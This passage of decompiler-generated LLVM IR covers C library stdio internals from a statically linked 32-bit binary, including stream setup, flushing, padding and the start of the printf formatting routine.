  store i32 %v2_80515b6, i32* %stack_var_-76, align 4
  %v2_80515bb = call i32 @__pthread_return_void(i32 %v2_80515b6, i32 134565087)
  store i32 %v2_80515bb, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805b2bc.468 to i32), i32* %stack_var_-76, align 4
  %v1_80515c7 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805b2bc.468 to i32))
  %v0_80515cc = load i32, i32* bitcast (i32** @global_var_805b2b8.469 to i32*), align 8
  store i32 %v0_80515cc, i32* @eax, align 4
  %v1_80515d1 = load i32, i32* @ebp, align 4
  %v2_80515d1 = add i32 %v1_80515d1, 32
  %v3_80515d1 = inttoptr i32 %v2_80515d1 to i32*
  store i32 %v0_80515cc, i32* %v3_80515d1, align 4
  %v2_80515d4 = load i32, i32* %stack_var_-76, align 4
  store i32 %v2_80515d4, i32* @ecx, align 4
  %v0_80515d5 = load i32, i32* @ebp, align 4
  store i32 %v0_80515d5, i32* bitcast (i32** @global_var_805b2b8.469 to i32*), align 8
  store i32 %v2_80515b6, i32* %stack_var_-76, align 4
  %v2_80515df = call i32 @__pthread_return_void(i32 %v2_80515b6, i32 1)
  store i32 %v2_80515b6, i32* @eax, align 4
  store i32 1, i32* @edx, align 4
  store i32 %v2_8051593, i32* %stack_var_-76, align 4
  %v2_80515e9 = call i32 @__pthread_return_void(i32 %v2_8051593, i32 1)
  br label %dec_label_pc_80515ee

dec_label_pc_80515ee:                             ; preds = %dec_label_pc_8051407, %dec_label_pc_8051588
  %storemerge = phi i32 [ %v2_80515e9, %dec_label_pc_8051588 ], [ %v1_805140d, %dec_label_pc_8051407 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80515f5

dec_label_pc_80515f3:                             ; preds = %dec_label_pc_80513fd, %dec_label_pc_80513ea
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_80515f5

dec_label_pc_80515f5:                             ; preds = %dec_label_pc_8051560, %dec_label_pc_8051436, %dec_label_pc_80515ee, %dec_label_pc_80515f3
  %v0_80515f8 = load i32, i32* @ebp, align 4
  store i32 %v0_80515f8, i32* %eax.global-to-local, align 4
  %v2_80515fa = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80515fa, i32* @ebx, align 4
  store i32 %v0_80513be, i32* @esi, align 4
  store i32 %v0_80513bd, i32* @edi, align 4
  store i32 %v0_80513bc, i32* @ebp, align 4
  ret i32 %v0_80515f8

; uselistorder directives
  uselistorder i32 %v2_80515b6, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v2_8051593, { 1, 0, 3, 2 }
  uselistorder i32 %v2_805154d, { 1, 0 }
  uselistorder i32 %v1_8051536, { 1, 0, 2, 3 }
  uselistorder i32 %v2_805151d, { 1, 0 }
  uselistorder i32 %v1_8051502, { 1, 0, 2 }
  uselistorder i32 %v11_80514b7, { 1, 0 }
  uselistorder i32 %v1_8051489, { 1, 0 }
  uselistorder i32 %v0_8051485, { 1, 0 }
  uselistorder i32 %v2_80514bb, { 1, 0, 2 }
  uselistorder i32 %v1_805143b, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %stack_var_-76, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13, 14 }
  uselistorder i32* %eax.global-to-local, { 1, 27, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 13, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 0, 25, 26 }
  uselistorder i32 191, { 0, 2, 1 }
  uselistorder i32 577, { 0, 2, 1 }
  uselistorder i32 %arg4, { 3, 1, 0, 2, 4, 5 }
  uselistorder label %dec_label_pc_80515f5, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_80515ee, { 1, 0 }
  uselistorder label %dec_label_pc_8051560, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80514ab, { 1, 0 }
  uselistorder label %dec_label_pc_8051468, { 1, 0 }
  uselistorder label %dec_label_pc_8051432, { 1, 0 }
  uselistorder label %dec_label_pc_8051419, { 2, 0, 1 }
}

define i32 @_stdio_init() local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8051601 = load i32, i32* @edi, align 4
  %v0_8051602 = load i32, i32* @esi, align 4
  %v0_8051603 = load i32, i32* @ebx, align 4
  store i32 %v0_8051603, i32* %stack_var_-16, align 4
  store i32 1, i32* @ebx, align 4
  %v1_805160c = call i32 @__errno_location(i32 %v0_8051603)
  %v0_8051614 = load i16, i16* @global_var_805b300.460, align 256
  %v1_8051614 = zext i16 %v0_8051614 to i32
  store i32 %v1_8051614, i32* @esi, align 4
  %v1_805161b = inttoptr i32 %v1_805160c to i32*
  %v2_805161b = load i32, i32* %v1_805161b, align 4
  store i32 %v2_805161b, i32* %ebp.global-to-local, align 4
  store i32 %v1_805160c, i32* @edi, align 4
  %v1_8051621 = call i32 @isatty(i32 0)
  %v0_8051626 = load i32, i32* @ebx, align 4
  %v2_805162f = sub i32 %v0_8051626, %v1_8051621
  %v2_8051633 = mul i32 %v2_805162f, 256
  %v0_8051636 = load i32, i32* @esi, align 4
  %v2_8051636 = xor i32 %v0_8051636, %v2_8051633
  %v1_8051638 = trunc i32 %v2_8051636 to i16
  store i16 %v1_8051638, i16* @global_var_805b300.460, align 256
  %v0_805163f = load i16, i16* @global_var_805b350.461, align 16
  %v1_805163f = zext i16 %v0_805163f to i32
  store i32 %v1_805163f, i32* @esi, align 4
  %v1_8051646 = call i32 @isatty(i32 1)
  %v0_805164b = load i32, i32* @ebx, align 4
  %v2_805164b = sub i32 %v0_805164b, %v1_8051646
  %v2_805164d = mul i32 %v2_805164b, 256
  %v0_8051650 = load i32, i32* @esi, align 4
  %v2_8051650 = xor i32 %v2_805164d, %v0_8051650
  %v1_8051652 = trunc i32 %v2_8051650 to i16
  store i16 %v1_8051652, i16* @global_var_805b350.461, align 16
  %v0_8051659 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8051659 = load i32, i32* @edi, align 4
  %v2_8051659 = inttoptr i32 %v1_8051659 to i32*
  store i32 %v0_8051659, i32* %v2_8051659, align 4
  %v2_805165e = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_805165e, i32* @ebx, align 4
  store i32 %v0_8051602, i32* @esi, align 4
  store i32 %v0_8051601, i32* @edi, align 4
  ret i32 %v1_8051646

; uselistorder directives
  uselistorder i32 %v1_805160c, { 1, 0 }
  uselistorder i16* @global_var_805b350.461, { 1, 0 }
  uselistorder i32 (i32)* @isatty, { 1, 0, 2 }
}

define i32 @__stdio_init_mutex(i32 %arg1) local_unnamed_addr {
entry:
  %v3_8051671 = inttoptr i32 %arg1 to i16*
  %v4_8051671 = call i32 @memcpy(i16* %v3_8051671, i32 ptrtoint (i32* @global_var_8059ca0.470 to i32), i32 24)
  ret i32 %v4_8051671
}

define i32 @_stdio_term() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_805167a = load i32, i32* @esi, align 4
  %v0_805167b = load i32, i32* @ebx, align 4
  store i32 %v0_805167b, i32* %stack_var_-8, align 4
  %v1_8051684 = call i32 @__stdio_init_mutex(i32 ptrtoint (i32* @global_var_805b2bc.468 to i32))
  store i32 %v1_8051684, i32* %eax.global-to-local, align 4
  %v1_8051690 = call i32 @__stdio_init_mutex(i32 ptrtoint (i32* @global_var_805b2d4.464 to i32))
  store i32 %v1_8051690, i32* %eax.global-to-local, align 4
  %storemerge21 = load i32, i32* bitcast (i32** @global_var_805b2b8.469 to i32*), align 4
  store i32 %storemerge21, i32* %ebx.global-to-local, align 4
  %v1_80516da22 = icmp eq i32 %storemerge21, 0
  %v1_80516dc24 = icmp eq i1 %v1_80516da22, false
  br i1 %v1_80516dc24, label %dec_label_pc_805169d.lr.ph, label %dec_label_pc_80516fa.preheader

dec_label_pc_805169d.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_805169d

dec_label_pc_805169d:                             ; preds = %dec_label_pc_805169d.lr.ph, %dec_label_pc_80516c4
  %storemerge25 = phi i32 [ %storemerge21, %dec_label_pc_805169d.lr.ph ], [ %storemerge, %dec_label_pc_80516c4 ]
  %v1_80516a0 = add i32 %storemerge25, 56
  store i32 %v1_80516a0, i32* @esi, align 4
  %v1_80516a4 = call i32 @__pthread_return_0(i32 %v1_80516a0)
  store i32 %v1_80516a4, i32* %eax.global-to-local, align 4
  %v1_80516ac = icmp eq i32 %v1_80516a4, 0
  br i1 %v1_80516ac, label %dec_label_pc_80516c4, label %dec_label_pc_80516b0

dec_label_pc_80516b0:                             ; preds = %dec_label_pc_805169d
  %v0_80516b0 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80516b0 = add i32 %v0_80516b0, 8
  %v2_80516b0 = inttoptr i32 %v1_80516b0 to i32*
  %v3_80516b0 = load i32, i32* %v2_80516b0, align 4
  store i32 %v3_80516b0, i32* %eax.global-to-local, align 4
  %v1_80516b3 = inttoptr i32 %v0_80516b0 to i16*
  store i16 48, i16* %v1_80516b3, align 2
  %v0_80516b8 = load i32, i32* %eax.global-to-local, align 4
  %v1_80516b8 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80516b8 = add i32 %v1_80516b8, 24
  %v3_80516b8 = inttoptr i32 %v2_80516b8 to i32*
  store i32 %v0_80516b8, i32* %v3_80516b8, align 4
  %v0_80516bb = load i32, i32* %eax.global-to-local, align 4
  %v1_80516bb = load i32, i32* %ebx.global-to-local, align 4
  %v2_80516bb = add i32 %v1_80516bb, 28
  %v3_80516bb = inttoptr i32 %v2_80516bb to i32*
  store i32 %v0_80516bb, i32* %v3_80516bb, align 4
  %v0_80516be = load i32, i32* %eax.global-to-local, align 4
  %v1_80516be = load i32, i32* %ebx.global-to-local, align 4
  %v2_80516be = add i32 %v1_80516be, 16
  %v3_80516be = inttoptr i32 %v2_80516be to i32*
  store i32 %v0_80516be, i32* %v3_80516be, align 4
  %v0_80516c1 = load i32, i32* %eax.global-to-local, align 4
  %v1_80516c1 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80516c1 = add i32 %v1_80516c1, 20
  %v3_80516c1 = inttoptr i32 %v2_80516c1 to i32*
  store i32 %v0_80516c1, i32* %v3_80516c1, align 4
  br label %dec_label_pc_80516c4

dec_label_pc_80516c4:                             ; preds = %dec_label_pc_805169d, %dec_label_pc_80516b0
  %v0_80516c7 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80516c7 = add i32 %v0_80516c7, 52
  %v2_80516c7 = inttoptr i32 %v1_80516c7 to i32*
  store i32 1, i32* %v2_80516c7, align 4
  %v0_80516ce = load i32, i32* @esi, align 4
  %v1_80516cf = call i32 @__stdio_init_mutex(i32 %v0_80516ce)
  store i32 %v1_80516cf, i32* %eax.global-to-local, align 4
  %v0_80516d4 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80516d4 = add i32 %v0_80516d4, 32
  %v2_80516d4 = inttoptr i32 %v1_80516d4 to i32*
  %storemerge = load i32, i32* %v2_80516d4, align 4
  store i32 %storemerge, i32* %ebx.global-to-local, align 4
  %v1_80516da = icmp eq i32 %storemerge, 0
  %v1_80516dc = icmp eq i1 %v1_80516da, false
  br i1 %v1_80516dc, label %dec_label_pc_805169d, label %dec_label_pc_80516d7.dec_label_pc_80516fa.preheader_crit_edge

dec_label_pc_80516d7.dec_label_pc_80516fa.preheader_crit_edge: ; preds = %dec_label_pc_80516c4
  %storemerge12.pre = load i32, i32* bitcast (i32** @global_var_805b2b8.469 to i32*), align 4
  br label %dec_label_pc_80516fa.preheader

dec_label_pc_80516fa.preheader:                   ; preds = %dec_label_pc_80516d7.dec_label_pc_80516fa.preheader_crit_edge, %entry
  %storemerge12 = phi i32 [ %storemerge12.pre, %dec_label_pc_80516d7.dec_label_pc_80516fa.preheader_crit_edge ], [ %storemerge21, %entry ]
  store i32 %storemerge12, i32* @ebx, align 4
  %v1_80516fa3 = icmp eq i32 %storemerge12, 0
  %v1_80516fc10 = icmp eq i1 %v1_80516fa3, false
  br i1 %v1_80516fc10, label %dec_label_pc_80516e6.preheader, label %dec_label_pc_80516fe

dec_label_pc_80516e6.preheader:                   ; preds = %dec_label_pc_80516fa.preheader
  br label %dec_label_pc_80516e6

dec_label_pc_80516e6:                             ; preds = %dec_label_pc_80516e6.preheader, %dec_label_pc_80516f7
  %v0_80516ee = phi i32 [ %storemerge1, %dec_label_pc_80516f7 ], [ %storemerge12, %dec_label_pc_80516e6.preheader ]
  %v1_80516e6 = inttoptr i32 %v0_80516ee to i8*
  %v2_80516e6 = load i8, i8* %v1_80516e6, align 1
  %v3_80516e6 = and i8 %v2_80516e6, 64
  %v4_80516e6 = icmp eq i8 %v3_80516e6, 0
  br i1 %v4_80516e6, label %dec_label_pc_80516f7, label %dec_label_pc_80516eb

dec_label_pc_80516eb:                             ; preds = %dec_label_pc_80516e6
  %v1_80516ef = call i32 @__stdio_wcommit(i32 %v0_80516ee)
  store i32 %v1_80516ef, i32* %eax.global-to-local, align 4
  %v0_80516f7.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80516f7

dec_label_pc_80516f7:                             ; preds = %dec_label_pc_80516e6, %dec_label_pc_80516eb
  %v0_80516f7 = phi i32 [ %v0_80516ee, %dec_label_pc_80516e6 ], [ %v0_80516f7.pre, %dec_label_pc_80516eb ]
  %v1_80516f7 = add i32 %v0_80516f7, 32
  %v2_80516f7 = inttoptr i32 %v1_80516f7 to i32*
  %storemerge1 = load i32, i32* %v2_80516f7, align 4
  store i32 %storemerge1, i32* @ebx, align 4
  %v1_80516fa = icmp eq i32 %storemerge1, 0
  %v1_80516fc = icmp eq i1 %v1_80516fa, false
  br i1 %v1_80516fc, label %dec_label_pc_80516e6, label %dec_label_pc_80516fe

dec_label_pc_80516fe:                             ; preds = %dec_label_pc_80516f7, %dec_label_pc_80516fa.preheader
  %v2_80516fe = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80516fe, i32* %eax.global-to-local, align 4
  %v2_80516ff = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80516ff, i32* @ebx, align 4
  store i32 %v0_805167a, i32* @esi, align 4
  ret i32 %v2_80516fe

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 2, 0 }
  uselistorder i32 %storemerge12, { 2, 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32* %ebx.global-to-local, { 8, 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 (i32)* @__stdio_init_mutex, { 2, 1, 0, 4, 3 }
  uselistorder label %dec_label_pc_80516f7, { 1, 0 }
  uselistorder label %dec_label_pc_80516e6, { 1, 0 }
  uselistorder label %dec_label_pc_80516c4, { 1, 0 }
  uselistorder label %dec_label_pc_805169d, { 1, 0 }
}

define i32 @__stdio_wcommit(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp11, i32* %stack_var_-12, align 4
  %v0_8051704 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_805170c = add i32 %arg1, 8
  %v2_805170c = inttoptr i32 %v1_805170c to i32*
  %v3_805170c = load i32, i32* %v2_805170c, align 4
  store i32 %v3_805170c, i32* %edx.global-to-local, align 4
  %v1_805170f = add i32 %arg1, 16
  %v2_805170f = inttoptr i32 %v1_805170f to i32*
  %v3_805170f = load i32, i32* %v2_805170f, align 4
  %v2_8051712 = sub i32 %v3_805170f, %v3_805170c
  %v12_8051712 = icmp eq i32 %v2_8051712, 0
  store i32 %v2_8051712, i32* %eax.global-to-local, align 4
  br i1 %v12_8051712, label %dec_label_pc_8051725, label %dec_label_pc_8051716

dec_label_pc_8051716:                             ; preds = %entry
  store i32 %v3_805170c, i32* %v2_805170f, align 4
  %v0_8051719 = load i32, i32* @ecx, align 4
  %v0_805171a = load i32, i32* %eax.global-to-local, align 4
  %v0_805171b = load i32, i32* %edx.global-to-local, align 4
  %v0_805171c = load i32, i32* @ebx, align 4
  %v4_805171d = inttoptr i32 %v0_805171c to i16*
  %v5_805171d = call i32 @__stdio_WRITE(i16* %v4_805171d, i32 %v0_805171b, i32 %v0_805171a, i32 %v0_8051719)
  store i32 %v5_805171d, i32* %eax.global-to-local, align 4
  %v0_8051725.pre = load i32, i32* @ebx, align 4
  %v2_805172b.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_8051725

dec_label_pc_8051725:                             ; preds = %entry, %dec_label_pc_8051716
  %v2_805172b = phi i32 [ %tmp11, %entry ], [ %v2_805172b.pre, %dec_label_pc_8051716 ]
  %v0_8051725 = phi i32 [ %arg1, %entry ], [ %v0_8051725.pre, %dec_label_pc_8051716 ]
  %v1_8051725 = add i32 %v0_8051725, 16
  %v2_8051725 = inttoptr i32 %v1_8051725 to i32*
  %v3_8051725 = load i32, i32* %v2_8051725, align 4
  store i32 %v3_8051725, i32* %eax.global-to-local, align 4
  %v2_8051728 = add i32 %v0_8051725, 8
  %v3_8051728 = inttoptr i32 %v2_8051728 to i32*
  %v4_8051728 = load i32, i32* %v3_8051728, align 4
  %v5_8051728 = sub i32 %v3_8051725, %v4_8051728
  store i32 %v5_8051728, i32* %eax.global-to-local, align 4
  store i32 %v2_805172b, i32* @edx, align 4
  store i32 %v0_8051704, i32* @ebx, align 4
  ret i32 %v5_8051728

; uselistorder directives
  uselistorder i32 %v0_8051725, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8051725, { 1, 0 }
}

define i32 @_charpad() local_unnamed_addr {
entry:
  %stack_var_-13 = alloca i32, align 4
  %v0_8051730 = load i32, i32* @edi, align 4
  %v0_8051731 = load i32, i32* @eax, align 4
  store i32 %v0_8051731, i32* @edi, align 4
  %v0_8051733 = load i32, i32* @esi, align 4
  %v0_8051734 = load i32, i32* @ecx, align 4
  store i32 %v0_8051734, i32* @esi, align 4
  %v0_8051736 = load i32, i32* @ebx, align 4
  store i32 %v0_8051734, i32* @ebx, align 4
  %v0_805173c = load i32, i32* @edx, align 4
  store i32 %v0_805173c, i32* %stack_var_-13, align 4
  %v1_80517432 = icmp eq i32 %v0_8051734, 0
  br i1 %v1_80517432, label %dec_label_pc_805175b, label %dec_label_pc_8051747.lr.ph

dec_label_pc_8051747.lr.ph:                       ; preds = %entry
  %v2_8051747 = ptrtoint i32* %stack_var_-13 to i32
  br label %dec_label_pc_8051747

dec_label_pc_8051742:                             ; preds = %dec_label_pc_8051747
  %v1_8051742 = add i32 %v0_8051742, -1
  %v8_8051742 = icmp eq i32 %v1_8051742, 0
  store i32 %v1_8051742, i32* @ebx, align 4
  br i1 %v8_8051742, label %dec_label_pc_805175b.loopexit, label %dec_label_pc_8051742.dec_label_pc_8051747_crit_edge

dec_label_pc_8051742.dec_label_pc_8051747_crit_edge: ; preds = %dec_label_pc_8051742
  %v0_805174b.pre = load i32, i32* @edx, align 4
  %v0_805174c.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8051747

dec_label_pc_8051747:                             ; preds = %dec_label_pc_8051742.dec_label_pc_8051747_crit_edge, %dec_label_pc_8051747.lr.ph
  %v0_805174c = phi i32 [ %v0_805174c.pre, %dec_label_pc_8051742.dec_label_pc_8051747_crit_edge ], [ %v0_8051731, %dec_label_pc_8051747.lr.ph ]
  %v0_805174b = phi i32 [ %v0_805174b.pre, %dec_label_pc_8051742.dec_label_pc_8051747_crit_edge ], [ %v0_805173c, %dec_label_pc_8051747.lr.ph ]
  %v4_8051750 = call i32 @__stdio_fwrite(i32 %v2_8051747, i32 1, i32 %v0_805174c, i32 %v0_805174b)
  %v8_8051758 = icmp eq i32 %v4_8051750, 1
  %v0_8051742 = load i32, i32* @ebx, align 4
  br i1 %v8_8051758, label %dec_label_pc_8051742, label %dec_label_pc_805175b.loopexit

dec_label_pc_805175b.loopexit:                    ; preds = %dec_label_pc_8051742, %dec_label_pc_8051747
  %v1_805175e.ph = phi i32 [ %v0_8051742, %dec_label_pc_8051747 ], [ 0, %dec_label_pc_8051742 ]
  %v0_805175e.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805175b

dec_label_pc_805175b:                             ; preds = %dec_label_pc_805175b.loopexit, %entry
  %v0_805175e = phi i32 [ 0, %entry ], [ %v0_805175e.pre, %dec_label_pc_805175b.loopexit ]
  %v1_805175e = phi i32 [ 0, %entry ], [ %v1_805175e.ph, %dec_label_pc_805175b.loopexit ]
  %v2_805175e = sub i32 %v0_805175e, %v1_805175e
  store i32 %v0_8051736, i32* @ebx, align 4
  store i32 %v0_8051733, i32* @esi, align 4
  store i32 %v0_8051730, i32* @edi, align 4
  ret i32 %v2_805175e

; uselistorder directives
  uselistorder i32 %v1_8051742, { 1, 0 }
  uselistorder i32* %stack_var_-13, { 1, 0 }
  uselistorder label %dec_label_pc_805175b.loopexit, { 1, 0 }
}

define i32 @_fp_out_narrow(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  store i32 0, i32* @ebp, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v3_8051779 = trunc i32 %arg2 to i8
  %v5_8051779 = icmp slt i8 %v3_8051779, 0
  %v1_805177b = icmp eq i1 %v5_8051779, false
  %tmp21 = ptrtoint i8* %arg4 to i32
  br i1 %v1_805177b, label %dec_label_pc_80517ac, label %dec_label_pc_805177d

dec_label_pc_805177d:                             ; preds = %entry
  %v3_8051784 = call i32 @strlen(i8* %arg4)
  %v0_805178c = load i32, i32* @ebx, align 4
  %v2_805178c = sub i32 %v0_805178c, %v3_8051784
  store i32 %v2_805178c, i32* @ebx, align 4
  store i32 %v3_8051784, i32* @esi, align 4
  %tmp23 = icmp slt i32 %v2_805178c, 1
  br i1 %tmp23, label %dec_label_pc_80517aa, label %dec_label_pc_8051794

dec_label_pc_8051794:                             ; preds = %dec_label_pc_805177d
  store i32 %arg1, i32* @eax, align 4
  %v0_8051798 = load i32, i32* @edi, align 4
  %v1_8051798 = urem i32 %v0_8051798, 128
  store i32 %v1_8051798, i32* @edi, align 4
  store i32 %v2_805178c, i32* @ecx, align 4
  store i32 %v1_8051798, i32* @edx, align 4
  %v0_805179f = call i32 @_charpad()
  %v12_80517a4 = icmp eq i32 %v0_805179f, %v2_805178c
  store i32 %v0_805179f, i32* @ebp, align 4
  %v1_80517a8 = icmp eq i1 %v12_80517a4, false
  br i1 %v1_80517a8, label %dec_label_pc_80517c6, label %dec_label_pc_8051794.dec_label_pc_80517aa_crit_edge

dec_label_pc_8051794.dec_label_pc_80517aa_crit_edge: ; preds = %dec_label_pc_8051794
  %v0_80517aa.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80517aa

dec_label_pc_80517aa:                             ; preds = %dec_label_pc_8051794.dec_label_pc_80517aa_crit_edge, %dec_label_pc_805177d
  %v0_80517aa = phi i32 [ %v0_80517aa.pre, %dec_label_pc_8051794.dec_label_pc_80517aa_crit_edge ], [ %v3_8051784, %dec_label_pc_805177d ]
  store i32 %v0_80517aa, i32* @ebx, align 4
  br label %dec_label_pc_80517ac

dec_label_pc_80517ac:                             ; preds = %entry, %dec_label_pc_80517aa
  %v0_80517b7 = phi i32 [ %arg3, %entry ], [ %v0_80517aa, %dec_label_pc_80517aa ]
  %tmp24 = icmp slt i32 %v0_80517b7, 1
  br i1 %tmp24, label %dec_label_pc_80517c4, label %dec_label_pc_80517b2

dec_label_pc_80517b2:                             ; preds = %dec_label_pc_80517ac
  %v0_80517b2 = load i32, i32* @ecx, align 4
  %v5_80517bc = call i32 @__stdio_fwrite(i32 %tmp21, i32 %v0_80517b7, i32 %arg1, i32 %v0_80517b2)
  br label %dec_label_pc_80517c4

dec_label_pc_80517c4:                             ; preds = %dec_label_pc_80517ac, %dec_label_pc_80517b2
  %v1_80517c4 = phi i32 [ 0, %dec_label_pc_80517ac ], [ %v5_80517bc, %dec_label_pc_80517b2 ]
  %v0_80517c4 = load i32, i32* @ebp, align 4
  %v2_80517c4 = add i32 %v0_80517c4, %v1_80517c4
  br label %dec_label_pc_80517c6

dec_label_pc_80517c6:                             ; preds = %dec_label_pc_8051794, %dec_label_pc_80517c4
  %v0_80517c9 = phi i32 [ %v0_805179f, %dec_label_pc_8051794 ], [ %v2_80517c4, %dec_label_pc_80517c4 ]
  ret i32 %v0_80517c9

; uselistorder directives
  uselistorder i32 %v0_80517b7, { 1, 0 }
  uselistorder i32 %v0_805179f, { 1, 2, 0 }
  uselistorder i32 %v1_8051798, { 1, 0 }
  uselistorder i32 %v2_805178c, { 0, 2, 1, 3 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_80517c6, { 1, 0 }
  uselistorder label %dec_label_pc_80517c4, { 1, 0 }
  uselistorder label %dec_label_pc_80517ac, { 1, 0 }
}

define i32 @_vfprintf_internal(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %sf.global-to-local = alloca i1, align 1
  %st0.global-to-local = alloca x86_fp80, align 4
  %stack_var_-364 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_80517d3 = load i32, i32* @ebx, align 4
  store i32 %v0_80517d3, i32* %stack_var_-16, align 4
  %v4_80517d3 = ptrtoint i32* %stack_var_-16 to i32
  %v1_80517d4 = add i32 %v4_80517d3, -356
  %v10_80517d4 = icmp slt i32 %v1_80517d4, 0
  store i1 %v10_80517d4, i1* %sf.global-to-local, align 1
  %v4_80517da = ptrtoint i8* %arg2 to i32
  store i32 %v4_80517da, i32* @ebx, align 4
  %v2_80517e2 = ptrtoint i32* %stack_var_-348 to i32
  store i32 %v2_80517e2, i32* @esi, align 4
  %v5_80517e7 = call i32 @_ppfs_init(i32* nonnull %stack_var_-348, i32 %v4_80517da)
  store i32 %v5_80517e7, i32* %eax.global-to-local, align 4
  %v2_80517ef = icmp slt i32 %v5_80517e7, 0
  store i1 %v2_80517ef, i1* %sf.global-to-local, align 1
  %v1_80517f1 = icmp eq i1 %v2_80517ef, false
  br i1 %v1_80517f1, label %dec_label_pc_8051831, label %dec_label_pc_80517f3

dec_label_pc_80517f3:                             ; preds = %entry
  %v12_80517ec = ptrtoint i32* %stack_var_-364 to i32
  %v3_80517f3 = load i32, i32* %stack_var_-348, align 4
  store i32 %v3_80517f3, i32* @ebx, align 4
  %v1_80517f7 = add i32 %v12_80517ec, -12
  %v10_80517f7 = icmp slt i32 %v1_80517f7, 0
  store i1 %v10_80517f7, i1* %sf.global-to-local, align 1
  %v5_80517fa = inttoptr i32 %v3_80517f3 to i8*
  %v3_80517fb = call i32 @strlen(i8* %v5_80517fa)
  store i32 %v3_80517fb, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %stack_var_-364, align 4
  %v1_805180a = icmp eq i32 %v3_80517fb, 0
  %v2_805180a = icmp slt i32 %v3_80517fb, 0
  store i1 %v2_805180a, i1* %sf.global-to-local, align 1
  br i1 %v1_805180a, label %dec_label_pc_8051d7a, label %dec_label_pc_8051812

dec_label_pc_8051812:                             ; preds = %dec_label_pc_80517f3
  %v0_8051812 = load i32, i32* @edx, align 4
  %v0_805181b = load i32, i32* @ebx, align 4
  %v6_805181c = call i32 @__stdio_fwrite(i32 %v0_805181b, i32 %v3_80517fb, i32 %arg1, i32 %v0_8051812)
  store i32 %v6_805181c, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %stack_var_-364, align 4
  %v0_8051829 = load i32, i32* @esp, align 4
  %v1_8051829 = add i32 %v0_8051829, 16
  %v7_8051829 = icmp slt i32 %v1_8051829, 0
  store i1 %v7_8051829, i1* %sf.global-to-local, align 1
  br label %dec_label_pc_8051d7a

dec_label_pc_8051831:                             ; preds = %entry
  %v6_805183b = call i32 @_ppfs_prepargs(i32 %v2_80517e2, i32 %arg3, i32 %v5_80517e7, i32 %v5_80517e7)
  store i32 %v6_805183b, i32* %eax.global-to-local, align 4
  %v0_8051840 = load i32, i32* @ebx, align 4
  store i32 %v0_8051840, i32* %edx.global-to-local, align 4
  store i32 0, i32* %stack_var_-364, align 4
  %v0_805184a = load i32, i32* @esp, align 4
  %v1_805184a = add i32 %v0_805184a, 16
  %v7_805184a = icmp slt i32 %v1_805184a, 0
  store i1 %v7_805184a, i1* %sf.global-to-local, align 1
  br label %dec_label_pc_8051850

dec_label_pc_805184f:                             ; preds = %dec_label_pc_8051856
  %v1_805184f = add i32 %v0_805185e, 1
  %v9_805184f = icmp slt i32 %v1_805184f, 0
  store i1 %v9_805184f, i1* %sf.global-to-local, align 1
  store i32 %v1_805184f, i32* @ebx, align 4
  br label %dec_label_pc_8051850.backedge

dec_label_pc_8051850.backedge:                    ; preds = %dec_label_pc_805184f, %dec_label_pc_8051d60, %dec_label_pc_8051d6b
  %v1_805185a22 = phi i32 [ %v1_8051862, %dec_label_pc_805184f ], [ %v3_8051d60, %dec_label_pc_8051d60 ], [ %v1_805188e, %dec_label_pc_8051d6b ]
  %v0_805185020 = phi i32 [ %v1_805184f, %dec_label_pc_805184f ], [ %v3_8051d60, %dec_label_pc_8051d60 ], [ %v1_8051d6b, %dec_label_pc_8051d6b ]
  %v4_8051850.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051850

